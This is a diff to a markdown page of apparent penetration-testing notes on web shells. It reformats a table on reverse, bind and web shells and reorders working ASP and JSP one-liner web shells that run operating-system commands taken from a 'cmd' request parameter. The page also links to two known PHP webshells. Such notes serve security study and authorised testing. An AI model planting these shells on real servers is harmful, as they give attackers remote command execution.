@@ -12,10 +12,10 @@ tags:
 # Web shells
 
 ??? abstract "All about shells"
-    | **Shell Type**                       | **Description**                                                                                                                                                                                                                                   |
-    | ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.                                                                                                                                                                                    |
-    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box.                                                                                                                                                     |
+    | **Shell Type** | **Description** |
+    | ------- | -------- |
+    | [`Reverse shell`](reverse-shells.md) | Initiates a connection back to a "listener" on our attack box.  |
+    | [`Bind shell`](bind-shells.md)       | "Binds" to a specific port on the target host and waits for a connection from our attack box.  |
     | [`Web shell`](web-shells.md)         | Runs operating system commands via the web browser, typically not interactive or semi-interactive. It can also be used to run single commands (i.e., leveraging a file upload vulnerability and uploading a `PHP` script to run a single command. |
 
 
@@ -33,6 +33,19 @@ A web shell script is typically a one-liner that is very short and can be memori
 
 ## Some basic web shells
 
+### asp
+
+```asp
+<% eval request("cmd") %>
+```
+
+
+### jsp
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
 ### php
 
 ```php
@@ -41,19 +54,6 @@ A web shell script is typically a one-liner that is very short and can be memori
 
 - [Pentesmonkey webshell](pentesmonkey.md).
 - [WhiteWinterWolf webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php).
-
-### jsp
-
-```jsp
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-```
-
-### asp
-
-```asp
-<% eval request("cmd") %>
-```
-
 
 ## How to exploit a web shell
 
